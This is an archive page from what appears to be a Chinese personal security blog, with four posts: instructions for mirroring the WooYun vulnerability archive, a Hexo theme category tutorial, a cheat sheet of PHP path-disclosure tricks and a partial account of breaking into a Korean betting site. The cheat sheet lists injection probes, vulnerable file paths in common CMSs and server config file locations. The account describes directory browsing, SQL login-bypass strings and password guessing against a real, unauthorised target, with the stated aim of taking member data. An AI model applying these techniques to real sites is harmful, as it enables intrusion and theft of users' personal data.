
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>Bug&#39;小虫</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="小虫">
    

    
    <meta name="description" content="hark">
<meta property="og:type" content="website">
<meta property="og:title" content="Bug&#39;小虫">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Bug&#39;小虫">
<meta property="og:description" content="hark">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bug&#39;小虫">
<meta name="twitter:description" content="hark">

    
    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/05/07/乌云公开漏洞，知识库爬虫和搜索-整站镜像/" title="乌云公开漏洞，知识库爬虫和搜索+整站镜像" itemprop="url">乌云公开漏洞，知识库爬虫和搜索+整站镜像</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-05-07T06:51:56.000Z" itemprop="datePublished"> 发表于 2017-05-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>以下是资源以及利用方式</p>
<p>&lt;img src= <a href="http://opgnaclz6.bkt.clouddn.com/1b.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&gt;" target="_blank" rel="noopener">http://opgnaclz6.bkt.clouddn.com/1b.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&gt;</a><br>&lt;img src= <a href="http://opgnaclz6.bkt.clouddn.com/2b.jpg&gt;" target="_blank" rel="noopener">http://opgnaclz6.bkt.clouddn.com/2b.jpg&gt;</a></p>
<h1 id="安装相关组件"><a href="#安装相关组件" class="headerlink" title="安装相关组件:"></a>安装相关组件:</h1><ul>
<li><a href="https://www.python.org/downloads/release/python-2712/" target="_blank" rel="noopener">python 2.7和pip</a></li>
<li><a href="https://www.mongodb.com/cloud/atlas?jmp=download-center" target="_blank" rel="noopener">mongodb</a></li>
<li>scrapy (pip install scrapy)</li>
<li>flask (pip install Flask)</li>
<li><p>pymongo (pip install pymongo)</p>
<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1></li>
<li>乌云公开漏洞和知识库的爬虫分别位于目录scrapy/wooyun和scrapy/wooyun_drops</li>
<li>运行scrapy crawl wooyun -a page_max=1 -a local_store=false -a update=false，有三个参数用于控制爬取<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">## 参数使用：</span></span><br><span class="line">-a page_max: 控制爬取的页数，默认为1，如果值为0，表示所有页面</span><br><span class="line">-a local_store: 控制是否将每个漏洞离线存放到本地，默认为<span class="literal">false</span>  </span><br><span class="line">-a update：控制是否重复爬取，默认为<span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>第一次爬取全部内容时，用scrapy crawl wooyun -a page_max=0 -a update=true</li>
<li>平时只爬取最近的更新时，用scrapy crawl wooyun -a page_max=1，可以根据自己的爬取频率和网站更新情况调整page_max的值</li>
<li>全部公开漏洞的列表和每个漏洞的文本内容存在mongodb中，大概约2G内容；如果整站爬全部文本和图片作为离线查询，大概需要10G空间、2小时（10M电信带宽）；爬取全部知识库，总共约500M空间。（截止2015年10月）</li>
</ul>
<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><ul>
<li>漏洞搜索使用了Flask作为web server，bootstrap作为前端</li>
<li>启动web server ：在flask目录下运行python app.py，默认端口是5000</li>
<li>搜索：在浏览器通过<a href="http://localhost:5000进行搜索漏洞，多个关键字可以用空格分开。" target="_blank" rel="noopener">http://localhost:5000进行搜索漏洞，多个关键字可以用空格分开。</a></li>
<li>当进行全文搜索时，如果安装并启用了Elasicsearch，可提高全文搜索的效率；否则将使用mongodb的内置搜索，安装和启用方法见安装Elasicsearch。</li>
</ul>
<h2 id="为mongodb数据库创建索引"><a href="#为mongodb数据库创建索引" class="headerlink" title="为mongodb数据库创建索引"></a>为mongodb数据库创建索引</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">use wooyun</span><br><span class="line">db.wooyun_list.ensureIndex(&#123;<span class="string">"datetime"</span>:1&#125;)</span><br><span class="line">db.wooyun_drops.ensureIndex(&#123;<span class="string">"datetime"</span>:1&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h1><ul>
<li><p>虚拟机1：在2016年6月底爬的wooyun全部漏洞库和知识库内容，总共30G（压缩后约11G），网盘地址为：<a href="http://pan.baidu.com/s/1o7IEaAQ" target="_blank" rel="noopener">http://pan.baidu.com/s/1o7IEaAQ</a> 提取密码：d4cq，如果连接失效请联系我，我重新发，使用方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、压缩包解压后是一个vmware虚拟机的镜像，可以由vmware直接打开运行；</span><br><span class="line">2、由于在制作压缩包时虚拟机为“挂起”状态，当前虚拟机的IP地址可能和宿主机的IP地址段不一致，请将虚拟机重启后重新获取IP地址，虚拟机用户密码为hancool/qwe123；</span><br><span class="line">3、进入wooyun_public目录，先用git更新一下到最新的代码git pull；</span><br><span class="line">4、进入wooyun_public/flask目录，运行./app.py；</span><br><span class="line">5、打开浏览器，输入http://ip:5000，ip为虚拟机的网卡地址（使用ifconfig eth0查看）</span><br></pre></td></tr></table></figure>
</li>
<li><p>虚拟机2：已打包了一个安装了所有组件和程序的虚拟机（不包含具体内容，约980M），网盘地址为：<a href="http://pan.baidu.com/s/1sj67KDZ" target="_blank" rel="noopener">http://pan.baidu.com/s/1sj67KDZ</a> 密码：bafi如果连接失效请联系我，我重新发,使用方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、使用vmware或virtualbox导入虚拟机</span><br><span class="line">2、登录用户名hancool,密码qwe123</span><br><span class="line">3、进入wooyun_public目录，先用git更新一下到最新的代码git pull</span><br><span class="line">4、分别进入wooyun_public目录下的wooyun和wooyun_drops，运行爬虫爬取数据（爬取全部数据并且本地离线缓存）：scrapy crawl wooyun -a  page_max=0 -a local_store=<span class="literal">true</span> -a update=<span class="literal">true</span></span><br><span class="line">5、进入wooyun_publich目录下的flask，运行./app.py，启动web服务</span><br><span class="line">6、打开浏览器，输入http://ip:5000，ip为虚拟机的网卡地址（使用ifconfig eth0查看）</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><ul>
<li>本程序只用于技术研究和个人使用，程序组件均为开源程序，漏洞和知识库来源于乌云公开漏洞，版权归wooyun.org。</li>
</ul>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/资源/">资源</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/05/07/Hexo主题实现多级分类显示/" title="Hexo主题实现多级分类显示" itemprop="url">Hexo主题实现多级分类显示</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-05-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2017-05-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>最近在搞一个博客，是托管在github和gitcafe上的，利用Hexo生成的。<br>之后，发现一个问题，显示的分类都是一级的。而我想要的是：能显示多级分类,层次分明`的那样。</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>基本主题自带的分类显示都是一级的，如何显示多级?</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>所以，研究了一下，找到了理想的方法，方法如下:</p>
<p>1.利用系统的list_categories([categories], [options])辅助函数生成分类列表;</p>
<p>2.利用css实现样式.</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>说明：我使用的是jacman主题，以这个主题为例说明。</p>
<p>1.在主题文件夹下找到layout/_widget/category.ejs文件,内容如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (site.categories.length)&#123; %&gt;</span><br><span class="line">&lt;div class=<span class="string">"categorieslist"</span>&gt;</span><br><span class="line">  &lt;p class=<span class="string">"asidetitle"</span>&gt;&lt;%= __(<span class="string">'categories'</span>) %&gt;&lt;/p&gt;</span><br><span class="line">      &lt;ul&gt;</span><br><span class="line">      &lt;% site.categories.sort(<span class="string">'name'</span>).each(<span class="keyword">function</span>(item)&#123; %&gt;</span><br><span class="line">        &lt;% <span class="keyword">if</span>(item.posts.length)&#123; %&gt;</span><br><span class="line">          &lt;li&gt;&lt;a href=<span class="string">"&lt;%- config.root %&gt;&lt;%- item.path %&gt;"</span> title=<span class="string">"&lt;%= item.name %&gt;"</span>&gt;&lt;%= item.name %&gt;&lt;sup&gt;&lt;%= item.posts.length %&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">      &lt;% &#125;); %&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure></p>
<p>2.修改内容,利用上面提到的list_categories([categories], [options])辅助函数:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (site.categories.length)&#123; %&gt;</span><br><span class="line">&lt;div class=<span class="string">"category-block"</span>&gt;</span><br><span class="line">  &lt;h3 class=<span class="string">"asidetitle"</span>&gt;&lt;%= __(<span class="string">'categories'</span>) %&gt;&lt;/h3&gt;</span><br><span class="line">     &lt;%- list_categories(site.categories) %&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure></p>
<p>3.修改样式文件<br>•在主题文件夹下找到source/css/_partial/aside.styl文件,其他的也可能是source/css/_partial/sidebar.styl。反正，能在页面显示即可。</p>
<p>•添加新的样式，我的如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//categories</span><br><span class="line">.category-block&gt;ul&gt;li</span><br><span class="line">  border-bottom 1px solid <span class="comment">#ccc</span></span><br><span class="line">.category-block li</span><br><span class="line">  margin-bottom 8px</span><br><span class="line">.category-list</span><br><span class="line">  @media mini</span><br><span class="line">    width 45%</span><br><span class="line">    <span class="built_in">float</span> left</span><br><span class="line">    margin 0 5% 0 0</span><br><span class="line">  @media tablet</span><br><span class="line">    width 100%</span><br><span class="line">    <span class="built_in">float</span> none</span><br><span class="line">    margin .5em 0 0</span><br><span class="line">  .categoriy-list-item</span><br><span class="line">    padding .5em 5%</span><br><span class="line">  .category-list-count</span><br><span class="line">    top -.5em</span><br><span class="line">    padding-left .3em</span><br><span class="line">    font-size 75%</span><br><span class="line">    line-height 0</span><br><span class="line">    position relative</span><br><span class="line">    vertical-align baseline</span><br><span class="line">  ul, ol, dl</span><br><span class="line">    list-style none</span><br><span class="line">  ul, ol, dl</span><br><span class="line">    background-color <span class="comment">#f9f9fa</span></span><br><span class="line">    margin-left 20px</span><br><span class="line">    li</span><br><span class="line">      border-bottom 1px dashed <span class="comment">#ccc</span></span><br><span class="line">  .category-list-child</span><br><span class="line">    border-top 1px dashed <span class="comment">#ccc</span></span><br><span class="line">    margin-bottom 8px</span><br></pre></td></tr></table></figure></p>
<p>想实现不同的样式，自己可以修改。</p>
<h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p>效果图markdown写法如下</p>
<hr>
<p>title: Hexo主题实现多级分类显示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">- 前端</span><br><span class="line">- Hexo</span><br><span class="line">tags:</span><br><span class="line">- 前端</span><br><span class="line">- Hexo</span><br></pre></td></tr></table></figure></p>
<h2 id="date-2016-01-24-21-46-07"><a href="#date-2016-01-24-21-46-07" class="headerlink" title="date: 2016-01-24 21:46:07"></a>date: 2016-01-24 21:46:07</h2><p>原文来自:seay.me</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/git/">git</a>►<a class="article-category-link" href="/categories/git/hexo/">hexo</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/04/18/php爆网站绝对路径小结/" title="php爆网站绝对路径小结" itemprop="url">php爆网站绝对路径小结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-04-18T10:53:06.000Z" itemprop="datePublished"> 发表于 2017-04-18</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>Ps：只能说php太敏感了触摸到合适的位置它就给你爆路径。</p>
<p>前提: 当注入点为root权限  模式off  能union select</p>
<p>不知道网站物理路径时候的那叫一个蛋疼</p>
<p>1、单引号爆路径<br>说明：<br>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br><a href="http://www.xxx.com/news.php?id=149′" target="_blank" rel="noopener">www.xxx.com/news.php?id=149′</a></p>
<p>2、错误参数值爆路径<br>说明：<br>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><a href="http://www.xxx.com/researcharchive.php?id=-1" target="_blank" rel="noopener">www.xxx.com/researcharchive.php?id=-1</a></p>
<p>3、Google爆路径<br>说明：<br>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。<br>Site:xxx.edu.tw warning<br>Site:xxx.com.tw “fatal error”</p>
<p>4、测试文件爆路径<br>说明：<br>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br><a href="http://www.xxx.com/test.php" target="_blank" rel="noopener">www.xxx.com/test.php</a><br><a href="http://www.xxx.com/ceshi.php" target="_blank" rel="noopener">www.xxx.com/ceshi.php</a><br><a href="http://www.xxx.com/info.php" target="_blank" rel="noopener">www.xxx.com/info.php</a><br><a href="http://www.xxx.com/phpinfo.php" target="_blank" rel="noopener">www.xxx.com/phpinfo.php</a><br><a href="http://www.xxx.com/php_info.php" target="_blank" rel="noopener">www.xxx.com/php_info.php</a><br><a href="http://www.xxx.com/1.php" target="_blank" rel="noopener">www.xxx.com/1.php</a></p>
<p>5、phpmyadmin爆路径<br>说明：<br>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</p>
<ol>
<li>/phpmyadmin/libraries/lect_lang.lib.php</li>
<li>/phpMyAdmin/index.php?lang[]=1</li>
<li>/phpMyAdmin/phpinfo.php</li>
<li>load_file()</li>
<li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li>
<li>/phpmyadmin/libraries/select_lang.lib.php</li>
<li>/phpmyadmin/libraries/lect_lang.lib.php</li>
<li>/phpmyadmin/libraries/mcrypt.lib.php</li>
<li>/phpmyadmin/libraries/List_Database.class.php(版本2.11.9.2)</li>
</ol>
<ol start="5">
<li>dz爆路径<pre><code>/ucenter\control\admin\db.php
</code></pre><a href="http://www.liuyifei.cc/uc_server/control/admin/db.php" target="_blank" rel="noopener">http://www.liuyifei.cc/uc_server/control/admin/db.php</a><pre><code>/manyou/admincp.php?my_suffix=%0A%0DTOBY57
/manyou/userapp.php?%0D%0A=TOBY57
</code></pre></li>
</ol>
<ol start="6">
<li>fckeditor 爆绝对路径<br>fckeditor\editor\dialog\fck_spellerpages\spellerpages\server-scripts\spellchecker.php</li>
</ol>
<p>7、配置文件找路径<br>说明：<br>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</p>
<p>Windows:<br>c:\windows\php.ini                                    php配置文件<br>c:\windows\system32\inetsrv\MetaBase.xml              IIS虚拟主机配置文件</p>
<p>Linux:<br>/etc/php.ini                                           php配置文件<br>/etc/httpd/conf.d/php.conf<br>/etc/httpd/conf/httpd.conf                             Apache配置文件<br>/usr/local/apache/conf/httpd.conf<br>/usr/local/apache2/conf/httpd.conf<br>/usr/local/apache/conf/extra/httpd-vhosts.conf         虚拟目录配置文件</p>
<p>7、nginx文件类型错误解析爆路径<br>说明：<br>这是昨天无意中发现的方法，当然要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。<br><a href="http://www.xxx.com/top.jpg/x.php" target="_blank" rel="noopener">www.xxx.com/top.jpg/x.php</a></p>
<p>8、其他<br>dedecms<br>/member/templets/menulit.php<br>plus/paycenter/alipay/return_url.php<br>plus/paycenter/cbpayment/autoreceive.php<br>paycenter/nps/config_pay_nps.php<br>plus/task/dede-maketimehtml.php<br>plus/task/dede-optimize-table.php<br>plus/task/dede-upcache.php</p>
<p>WP<br>wp-admin/includes/file.php<br>wp-content/themes/baiaogu-seo/footer.php</p>
<p>ecshop商城系统暴路径漏洞文件<br>/api/cron.php<br>/wap/goods.php<br>/temp/compiled/ur_here.lbi.php<br>/temp/compiled/pages.lbi.php<br>/temp/compiled/user_transaction.dwt.php<br>/temp/compiled/history.lbi.php<br>/temp/compiled/page_footer.lbi.php<br>/temp/compiled/goods.dwt.php<br>/temp/compiled/user_clips.dwt.php<br>/temp/compiled/goods_article.lbi.php<br>/temp/compiled/comments_list.lbi.php<br>/temp/compiled/recommend_promotion.lbi.php<br>/temp/compiled/search.dwt.php<br>/temp/compiled/category_tree.lbi.php<br>/temp/compiled/user_passport.dwt.php<br>/temp/compiled/promotion_info.lbi.php<br>/temp/compiled/user_menu.lbi.php<br>/temp/compiled/message.dwt.php<br>/temp/compiled/admin/pagefooter.htm.php<br>/temp/compiled/admin/page.htm.php<br>/temp/compiled/admin/start.htm.php<br>/temp/compiled/admin/goods_search.htm.php<br>/temp/compiled/admin/index.htm.php<br>/temp/compiled/admin/order_list.htm.php<br>/temp/compiled/admin/menu.htm.php<br>/temp/compiled/admin/login.htm.php<br>/temp/compiled/admin/message.htm.php<br>/temp/compiled/admin/goods_list.htm.php<br>/temp/compiled/admin/pageheader.htm.php<br>/temp/compiled/admin/top.htm.php<br>/temp/compiled/top10.lbi.php<br>/temp/compiled/member_info.lbi.php<br>/temp/compiled/bought_goods.lbi.php<br>/temp/compiled/goods_related.lbi.php<br>/temp/compiled/page_header.lbi.php<br>/temp/compiled/goods_script.html.php<br>/temp/compiled/index.dwt.php<br>/temp/compiled/goods_fittings.lbi.php<br>/temp/compiled/myship.dwt.php<br>/temp/compiled/brands.lbi.php<br>/temp/compiled/help.lbi.php<br>/temp/compiled/goods_gallery.lbi.php<br>/temp/compiled/comments.lbi.php<br>/temp/compiled/myship.lbi.php<br>/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php<br>/includes/modules/cron/auto_manage.php<br>/includes/modules/cron/ipdel.php</p>
<p>DZbbs<br>manyou/admincp.php?my_suffix=%0A%0DTOBY57</p>
<p>z-blog<br>admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</p>
<p>php168爆路径<br>admin/inc/hack/count.php?job=list<br>admin/inc/hack/search.php?job=getcode<br>admin/inc/ajax/bencandy.php?job=do<br>cache/MysqlTime.txt</p>
<p>PHPcms2008-sp4<br>注册用户登陆后访问<br>phpcms/corpandresize/process.php?pic=../images/logo.gif</p>
<p>bo-blog<br>PoC:<br>/go.php/&lt;[evil code]&lt;PAGE 1</p>
<p>CMSeasy爆网站路径漏洞<br>漏洞出现在menu_top.php这个文件中<br>lib/mods/celive/menu_top.php<br>/lib/default/ballot_act.php<br>lib/default/special_act.php</p>
<p>其他思路:</p>
<ol>
<li><p>DOS方式，打算使目标网站的速度减慢，从而爆出路径。但在操作的过程中发现目标网站的防DOS系统做得很好，因此他不能成功获取绝对路径，那么怎么办呢？<br>解决方法其实也很简单，既然我们不能减慢目标网站的速度，那我们就想办法减慢自己的速度，这样达到的效果是一样的。那么怎么减慢我们自己的速度呢？也很简单，只要我们找一个速度极慢的代理，挂上以后再上目标网站，就有可能将绝对路径爆出来。</p>
</li>
<li><p>本地修改上传页面 保存1.htm  把1.htm修改为1.jpg  然后上传1.jpg可能爆出网站绝对路径</p>
</li>
</ol>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/04/10/对一个赛马网站进行的体检/" title="对一个赛马网站进行的体检" itemprop="url">对一个赛马网站进行的体检</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-04-10T10:09:10.000Z" itemprop="datePublished"> 发表于 2017-04-10</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>某日，一个朋友丢来一个网站让我来看看，（为了保护隐私，用A.COM来表示此站），<br>目标是要里面的会员信息。打开之，发现是一个韩国赌马网站。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/1bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim "></p>
<p>点击任何链接，URL地址均不变，又用框架隐藏真实地址了（韩国网站都这么干）<br>无法右击，直接点击浏览器的查看—源文件。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/2bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>真实地址出来了。（为了保护隐私，地址我用B.com来代替）<br>跟目标网站不在一个服务器。</p>
<p>访问<a href="http://B.com/ADclients/dl3/，发现跟A.COM一模一样，由此，确定这个是真正的目标了。" target="_blank" rel="noopener">http://B.com/ADclients/dl3/，发现跟A.COM一模一样，由此，确定这个是真正的目标了。</a></p>
<p>再访问<a href="http://B.com/ADclients/，惊喜，可以遍历目录" target="_blank" rel="noopener">http://B.com/ADclients/，惊喜，可以遍历目录</a></p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/3bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim "></p>
<p>逐一访问，发现都是同样的网站程序，还都打包了，都down下来吧。</p>
<p>一个一个下载下来分析，没有发现管理员入口，程序都一模一样，连配置文件的信息都一样。<br>目录结构如下</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/4bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/5bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>没有权限。<br>希望越大，失望越大。幻想破灭了。</p>
<p>怎么办呢？<br>对下载下来的网站代码做黑盒测试，找出注入漏洞。<br>嗯，这倒是一个好办法，先放放，当最后的必杀技使用吧。</p>
<p>之前只浏览了<a href="http://B.com/ADclients/目录" target="_blank" rel="noopener">http://B.com/ADclients/目录</a><br>去看看<a href="http://B.com的首页是什么样子吧。" target="_blank" rel="noopener">http://B.com的首页是什么样子吧。</a><br>打开之，兴奋，还是遍历目录。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/6bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>DLadmin，应该是后台，来控制ADclients内的网站的。<br>打开之，确实是后台登陆。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/7bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<p>由于是PHP的，试一试php万能密码（’ or 1=1 –  , ‘ or 1=1 # 和‘ or 1=1 /*）<br>都不行。<br>试试弱口令，也不行。<br>不知道管理员帐号密码啊，用MYSQL的配置信息组合一些常用密码来暴力，无果。</p>
<p>很是失望啊。</p>
<p>扫一扫后台目录下有什么有用的文件吧。<br>扫到了<a href="http://B.com/DLadmin/data/" target="_blank" rel="noopener">http://B.com/DLadmin/data/</a><br>灵光一闪，忽然想到下载下来的客户端的网站，也有这个文件夹，这个后台的目录结构应该跟客户端的目录结构差不多。<br>记得DATA目录下有个 session文件夹，session是用来记录和验证登陆信息的。<br>由于客户端的网站无登陆点，那个文件夹是空白的。</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/8bb.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
